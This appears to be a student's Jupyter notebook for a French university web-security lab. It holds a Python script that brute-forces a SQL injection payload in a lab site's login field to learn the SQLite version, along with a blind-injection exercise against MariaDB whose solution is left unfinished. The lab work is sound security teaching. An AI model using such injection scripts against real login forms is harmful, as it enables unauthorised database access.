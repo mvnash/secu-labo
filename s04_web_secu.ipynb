{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ipl I317B Sécurité : labos\n",
    "## Semaine 4 : Vulnérabilitées web (2)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1:\n",
    "Revenons un peux en arrière sur le site de notre mauvais développeur. Nous savons que le site utilise sqlite comme système de gestion de base de donnée mais nous aimerions en identifier la version. Utilisez le site de l'exercice 1 pour récupérer cette information.\n",
    "\n",
    "https://labosecuipl.alwaysdata.net/23/s02/ex1a/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['3.43.1', '3.43.0', '3.42.0', '3.41.2', '3.41.1', '3.41.0', '3.40.1', '3.40.0', '3.39.4', '3.39.3', '3.39.2', '3.39.1', '3.39.0', '3.38.5', '3.38.4', '3.38.3', '3.38.2', '3.38.1', '3.38.0', '3.37.2', '3.37.1', '3.37.0', '3.36.0', '3.35.5', '3.35.4', '3.35.3', '3.35.2', '3.35.1', '3.35.0', '3.34.1', '3.34.0', '3.33.0', '3.32.3', '3.32.2', '3.32.1', '3.32.0', '3.31.1', '3.31.0', '3.30.1', '3.30.0', '3.29.0', '3.28.0', '3.27.2', '3.27.1', '3.27.0', '3.26.0', '3.25.3', '3.25.2', '3.25.1', '3.25.0', '3.24.0', '3.23.1', '3.23.0', '3.22.0', '3.21.0', '3.20.1', '3.20.0', '3.18.2', '3.18.1', '3.19.3', '3.19.2', '3.19.1', '3.19.0', '3.18.0', '3.17.0', '3.16.2', '3.16.1', '3.16.0', '3.15.2', '3.15.1', '3.15.0', '3.14.2', '3.14.1', '3.14', '3.13.0', '3.12.2', '3.12.1', '3.9.3', '3.12.0', '3.11.1', '3.11.0', '3.10.2', '3.10.1', '3.10.0', '3.9.2', '3.9.1', '3.9.0', '3.8.11.1', '3.8.11', '3.8.10.2', '3.8.10.1', '3.8.10', '3.8.9', '3.8.8.3', '3.8.8.2', '3.8.8.1', '3.8.8', '3.8.7.4', '3.8.7.3', '3.8.7.2', '3.8.7.1', '3.8.7', '3.8.6', '3.8.5', '3.8.4.3', '3.8.4.2', '3.8.4.1', '3.8.4', '3.8.3.1', '3.8.3', '3.8.2', '3.8.1', '3.8.0.2', '3.8.0.1', '3.8.0', '3.7.17', '3.7.16.2', '3.7.16.1', '3.7.16', '3.7.15.2', '3.7.15.1', '3.7.15', '3.7.14.1', '3.7.14', '3.7.13', '3.7.12.1', '3.7.12', '3.7.12', '3.7.12', '3.7.11', '3.7.10', '3.7.9', '3.7.8', '3.7.7.1', '3.7.7', '3.7.6.3', '3.7.6.2', '3.7.6.1', '3.7.6', '3.7.5', '3.7.4', '3.7.3', '3.7.2', '3.7.1', '3.7.0.1', '3.7.0', '3.6.23.1', '3.6.23', '3.6.22', '3.6.21', '3.6.20', '3.6.16.1', '3.6.19', '3.6.18', '3.6.17', '3.6.16', '3.6.15', '3.6.14.2', '3.6.14.1', '3.6.14', '3.6.13', '3.6.12', '3.6.11', '3.6.10', '3.6.9', '3.6.8', '3.6.7', '3.6.6.2', '3.6.6.1', '3.6.6', '3.6.5', '3.6.4', '3.6.3', '3.6.2', '3.6.1', '3.6.0', '3.5.9', '3.5.8', '3.5.7', '3.5.6', '3.5.5', '3.5.4', '3.5.3', '3.5.2', '3.5.1', '3.5.0', '3.4.2', '3.4.1', '3.4.0', '3.3.17', '3.3.16', '3.3.15', '3.3.14', '3.3.13', '3.3.12', '3.3.11', '3.3.10', '3.3.9', '3.3.8', '3.3.7', '3.3.6', '3.3.5', '3.3.4', '3.3.3', '3.3.2', '3.3.1', '3.3.0', '3.2.8', '3.2.7', '3.2.6', '3.2.5', '3.2.4', '3.2.3', '3.2.2', '3.2.1', '3.2.0', '3.1.6', '3.1.5', '3.1.4', '3.1.3', '3.1.2', '3.1.1', '3.1.0', '3.0.8', '3.0.7', '3.0.6', '3.0.5', '3.0.4', '3.0.3', '3.0.2', '3.0.1', '3.0.0']\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "\n",
    "versionPage = requests.get(\n",
    "    \"https://www.sqlite.org/chronology.html\"\n",
    ")\n",
    "\n",
    "soup = BeautifulSoup(versionPage.text)\n",
    "versions = []\n",
    "for a in soup.find_all('a', href=True):\n",
    "    if a[\"href\"].startswith(\"release\"):\n",
    "        versions.append(a.text)\n",
    "print(versions)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "3.27.2\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "for version in versions:\n",
    "    injection = '\"OR sqlite_version() = \"' + version + '\";--';\n",
    "    page = requests.post(\n",
    "    \"https://labosecuipl.alwaysdata.net/23/s02/ex1a/\",\n",
    "    data={  #TODO\n",
    "        \"login\": injection,\n",
    "        \"password\": \"\"\n",
    "        }\n",
    "    )\n",
    "    if \"Good job\" in page.text:\n",
    "        print(version)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 2:\n",
    "Pour ce dernier exercice, vous allez travailler un peu à l'aveugle. En effet, la page suicitant notre intérêt cette fois-ci ne contient pas grand chose à part à un bouton ... mais elle est injectable (promis) !\n",
    "\n",
    "À vous de trouvez comment et de récupérer la version du système de gestion de base de donnée : https://labosecuipl.alwaysdata.net/23/s04/ex2/\n",
    "\n",
    "Tips:\n",
    "  - Cette fois-ci, c'est plus du sqlite : https://mariadb.com/kb/en/version/\n",
    "  - Et vous travaillez à l'aveugle ;-)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "#TODO"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
